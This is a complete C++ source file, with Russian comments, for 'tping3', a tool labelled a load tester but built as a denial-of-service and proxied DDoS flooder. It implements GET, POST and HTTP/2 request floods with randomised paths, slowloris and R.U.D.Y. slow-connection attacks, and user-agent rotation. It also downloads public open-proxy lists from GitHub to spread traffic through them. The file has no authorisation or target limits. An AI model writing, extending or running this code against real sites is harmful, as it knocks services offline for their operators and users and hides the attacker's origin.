// ============================================================================
// tping3.cpp – HTTP/HTTPS нагрузочный тестер
// Режимы: -dos (по умолчанию) | -ddos (через прокси)
// ============================================================================

#include <iostream>
#include <string>
#include <vector>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <chrono>
#include <thread>
#include <atomic>
#include <mutex>
#include <sstream>
#include <fstream>
#include <iomanip>
#include <random>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <signal.h>
#include <curl/curl.h>

using namespace std;
using namespace chrono;

atomic<bool> running(true);
atomic<unsigned long long> sent_requests(0);
atomic<unsigned long long> err_requests(0);
atomic<unsigned long long> code_200(0);
atomic<unsigned long long> code_429(0);
atomic<unsigned long long> code_503(0);
atomic<unsigned long long> code_other(0);
atomic<unsigned long long> timeouts(0);

string target_url;
int target_port = 80;
bool use_https = false;
int duration_sec = 0;
int threads_count = 200;
string user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0";
vector<string> ua_list;
vector<string> proxies;
bool ddos_mode = false;
mutex proxies_mutex;

void sigint_handler(int) { running = false; }

// ==================== УТИЛИТЫ ====================
string rand_str(int len) {
    static const char alnum[] = "0123456789abcdefghijklmnopqrstuvwxyz";
    string s;
    for (int i = 0; i < len; ++i) s += alnum[rand() % (sizeof(alnum) - 1)];
    return s;
}

size_t write_cb(void*, size_t size, size_t nmemb, void*) { return size * nmemb; }

string get_random_proxy() {
    lock_guard<mutex> lock(proxies_mutex);
    if (proxies.empty()) return "";
    return proxies[rand() % proxies.size()];
}

vector<string> load_proxies_from_file(const string& filename) {
    vector<string> result;
    ifstream f(filename);
    if (!f.is_open()) return result;
    string line;
    while (getline(f, line)) {
        if (!line.empty() && line.find(':') != string::npos) result.push_back(line);
    }
    return result;
}

vector<string> load_proxies_from_github() {
    vector<string> result;
    vector<string> urls = {
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies.txt"
    };
    for (const auto& url : urls) {
        string cmd = "curl -s --max-time 10 \"" + url + "\" 2>/dev/null";
        FILE* fp = popen(cmd.c_str(), "r");
        if (!fp) continue;
        char buf[512];
        while (fgets(buf, sizeof(buf), fp)) {
            string line = buf;
            while (!line.empty() && (line.back() == '\n' || line.back() == '\r' || line.back() == ' '))
                line.pop_back();
            if (!line.empty() && line.find(':') != string::npos) result.push_back(line);
        }
        pclose(fp);
    }
    return result;
}

void load_proxies_smart() {
    proxies = load_proxies_from_file("proxies.txt");
    if (proxies.empty()) proxies = load_proxies_from_file("/usr/local/bin/proxies.txt");
    if (proxies.empty()) proxies = load_proxies_from_file("./proxies.txt");
    if (proxies.empty()) {
        cerr << "[*] proxies.txt не найден, загружаю с GitHub...\n";
        proxies = load_proxies_from_github();
    }
    if (proxies.empty()) {
        cerr << "[-] Прокси не загружены. Режим -ddos отключён, работаю как -dos.\n";
        ddos_mode = false;
    } else {
        cout << "[+] Загружено прокси: " << proxies.size() << "\n";
    }
}

// ==================== CURL ====================
CURL* make_curl() {
    CURL* curl = curl_easy_init();
    if (!curl) return nullptr;
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 3L);
    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 2L);
    curl_easy_setopt(curl, CURLOPT_FORBID_REUSE, 1L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_MAXREDIRS, 3L);
    curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);
    if (use_https) {
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    }
    string ua = user_agent;
    if (!ua_list.empty()) ua = ua_list[rand() % ua_list.size()];
    curl_easy_setopt(curl, CURLOPT_USERAGENT, ua.c_str());

    if (ddos_mode) {
        string proxy = get_random_proxy();
        if (!proxy.empty()) {
            curl_easy_setopt(curl, CURLOPT_PROXY, proxy.c_str());
            curl_easy_setopt(curl, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
        }
    }
    return curl;
}

void handle_response(CURLcode res, long code) {
    sent_requests++;
    if (res != CURLE_OK) {
        if (res == CURLE_OPERATION_TIMEDOUT) timeouts++;
        else err_requests++;
        return;
    }
    if (code == 200) code_200++;
    else if (code == 429) code_429++;
    else if (code == 503) code_503++;
    else code_other++;
}

// ==================== WORKERS ====================
void worker_get() {
    CURL* curl = make_curl();
    if (!curl) return;
    while (running) {
        string url = target_url + "/" + rand_str(8) + "?" + rand_str(12);
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        CURLcode res = curl_easy_perform(curl);
        long http_code = 0;
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
        handle_response(res, http_code);
        if (ddos_mode) {
            string proxy = get_random_proxy();
            if (!proxy.empty()) curl_easy_setopt(curl, CURLOPT_PROXY, proxy.c_str());
        }
    }
    curl_easy_cleanup(curl);
}

void worker_post() {
    CURL* curl = make_curl();
    if (!curl) return;
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    while (running) {
        string body = "data=" + rand_str(256);
        curl_easy_setopt(curl, CURLOPT_URL, (target_url + "/" + rand_str(8)).c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)body.size());
        CURLcode res = curl_easy_perform(curl);
        long http_code = 0;
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
        handle_response(res, http_code);
        if (ddos_mode) {
            string proxy = get_random_proxy();
            if (!proxy.empty()) curl_easy_setopt(curl, CURLOPT_PROXY, proxy.c_str());
        }
    }
    curl_easy_cleanup(curl);
}

void worker_http2() {
    CURL* curl = make_curl();
    if (!curl) return;
    curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_2_0);
    while (running) {
        string url = target_url + "/" + rand_str(8);
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        CURLcode res = curl_easy_perform(curl);
        long http_code = 0;
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
        handle_response(res, http_code);
        if (ddos_mode) {
            string proxy = get_random_proxy();
            if (!proxy.empty()) curl_easy_setopt(curl, CURLOPT_PROXY, proxy.c_str());
        }
    }
    curl_easy_cleanup(curl);
}

void worker_slowloris(const string& host, int port) {
    while (running) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) break;
        struct sockaddr_in dest;
        dest.sin_family = AF_INET;
        dest.sin_port = htons(port);
        inet_pton(AF_INET, host.c_str(), &dest.sin_addr);
        if (connect(sock, (struct sockaddr*)&dest, sizeof(dest)) < 0) { close(sock); continue; }
        string req = "GET /" + rand_str(8) + " HTTP/1.1\r\nHost: " + host + "\r\n";
        send(sock, req.c_str(), req.size(), 0);
        while (running) {
            string h = "X-a: " + rand_str(4) + "\r\n";
            if (send(sock, h.c_str(), h.size(), 0) <= 0) break;
            this_thread::sleep_for(milliseconds(10 + rand() % 20));
        }
        close(sock);
    }
}

void worker_rudy(const string& host, int port) {
    while (running) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) break;
        struct sockaddr_in dest;
        dest.sin_family = AF_INET;
        dest.sin_port = htons(port);
        inet_pton(AF_INET, host.c_str(), &dest.sin_addr);
        if (connect(sock, (struct sockaddr*)&dest, sizeof(dest)) < 0) { close(sock); continue; }
        string req = "POST /" + rand_str(8) + " HTTP/1.1\r\nHost: " + host +
                     "\r\nContent-Length: 100000\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n";
        send(sock, req.c_str(), req.size(), 0);
        while (running) {
            string chunk = "a=" + rand_str(4);
            if (send(sock, chunk.c_str(), chunk.size(), 0) <= 0) break;
            this_thread::sleep_for(milliseconds(50 + rand() % 100));
        }
        close(sock);
    }
}

// ==================== СТАТИСТИКА ====================
void stats_loop() {
    auto start = steady_clock::now();
    while (running) {
        this_thread::sleep_for(seconds(1));
        auto now = steady_clock::now();
        double sec = duration_cast<milliseconds>(now - start).count() / 1000.0;
        double rps = sec > 0 ? sent_requests.load() / sec : 0;
        cout << "\r[+] rps: " << fixed << setprecision(0) << rps
             << " | 200: " << code_200.load()
             << " | 429: " << code_429.load()
             << " | 503: " << code_503.load()
             << " | other: " << code_other.load()
             << " | timeout: " << timeouts.load()
             << " | err: " << err_requests.load()
             << "     " << flush;
    }
    cout << endl;
}

// ==================== ЗАПУСК ====================
void tping3_run(const string& mode) {
    string host = target_url;
    if (host.find("https://") == 0) host = host.substr(8);
    else if (host.find("http://") == 0) host = host.substr(7);
    if (host.find('/') != string::npos) host = host.substr(0, host.find('/'));

    cout << "\n[*] Target: " << target_url << " mode=" << mode
         << " threads=" << threads_count
         << (ddos_mode ? (" [ddos via proxies: " + to_string(proxies.size()) + "]") : " [dos]")
         << (duration_sec ? (" duration=" + to_string(duration_sec) + "s") : " [infinite]")
         << "\n";

    thread stats(stats_loop);
    vector<thread> workers;

    for (int i = 0; i < threads_count; ++i) {
        if (mode == "get") workers.emplace_back(worker_get);
        else if (mode == "post") workers.emplace_back(worker_post);
        else if (mode == "http2") workers.emplace_back(worker_http2);
        else if (mode == "slowloris") workers.emplace_back(worker_slowloris, host, target_port);
        else if (mode == "rudy") workers.emplace_back(worker_rudy, host, target_port);
        else if (mode == "mix") {
            int m = i % 4;
            if (m == 0) workers.emplace_back(worker_get);
            else if (m == 1) workers.emplace_back(worker_post);
            else if (m == 2) workers.emplace_back(worker_slowloris, host, target_port);
            else workers.emplace_back(worker_http2);
        }
    }

    if (duration_sec > 0) {
        this_thread::sleep_for(seconds(duration_sec));
        running = false;
    }

    for (auto& t : workers) if (t.joinable()) t.join();
    if (stats.joinable()) stats.join();

    cout << "\n--- tping3 statistics ---\n";
    cout << "Requests sent: " << sent_requests.load() << "\n";
    cout << "HTTP 200:  " << code_200.load() << "\n";
    cout << "HTTP 429:  " << code_429.load() << "\n";
    cout << "HTTP 503:  " << code_503.load() << "\n";
    cout << "Other:     " << code_other.load() << "\n";
    cout << "Timeout:   " << timeouts.load() << "\n";
    cout << "Errors:    " << err_requests.load() << "\n";
}

// ==================== СПРАВКА ====================
void show_help() {
    cout << "tping3 – HTTP/HTTPS нагрузочный тестер\n";
    cout << "Использование: tping3 [-dos|-ddos] -url <URL> -mode <mode> [-t N] [-d SEC] [-ua FILE]\n";
    cout << "Режимы:\n";
    cout << "  -dos          отправка с локального IP (по умолчанию)\n";
    cout << "  -ddos         распределённая отправка (proxies.txt или автозагрузка)\n";
    cout << "Режимы атаки:\n";
    cout << "  get | post | http2 | slowloris | rudy | mix\n";
    cout << "Флаги:\n";
    cout << "  -url <URL>     целевой URL (с http:// или https://)\n";
    cout << "  -mode <mode>   режим (по умолчанию get)\n";
    cout << "  -t <N>         число потоков (1..512)\n";
    cout << "  -d <SEC>       длительность в секундах\n";
    cout << "  -ua <FILE>     список User-Agent (по одному на строку)\n";
}

// ==================== MAIN ====================
int main(int argc, char* argv[]) {
    signal(SIGINT, sigint_handler);
    srand(time(nullptr));
    curl_global_init(CURL_GLOBAL_ALL);

    if (argc < 2) { show_help(); return 0; }
    string first = argv[1];
    if (first == "-help" || first == "--help" || first == "-h") { show_help(); return 0; }

    string mode = "get";
    for (int i = 1; i < argc; ++i) {
        string arg = argv[i];
        if (arg == "-dos") ddos_mode = false;
        else if (arg == "-ddos") ddos_mode = true;
        else if (arg == "-url" && i + 1 < argc) target_url = argv[++i];
        else if (arg == "-mode" && i + 1 < argc) mode = argv[++i];
        else if (arg == "-t" && i + 1 < argc) {
            threads_count = stoi(argv[++i]);
            if (threads_count < 1) threads_count = 1;
            if (threads_count > 512) threads_count = 512;
        }
        else if (arg == "-d" && i + 1 < argc) duration_sec = stoi(argv[++i]);
        else if (arg == "-ua" && i + 1 < argc) {
            ifstream f(argv[++i]);
            string line;
            while (getline(f, line)) if (!line.empty()) ua_list.push_back(line);
        }
    }

    if (ddos_mode) load_proxies_smart();
    if (target_url.empty()) { show_help(); return 1; }

    if (target_url.find("https://") == 0) { use_https = true; target_port = 443; }
    else if (target_url.find("http://") == 0) { use_https = false; target_port = 80; }
    else { target_url = "http://" + target_url; use_https = false; target_port = 80; }

    tping3_run(mode);

    curl_global_cleanup();
    return 0;
}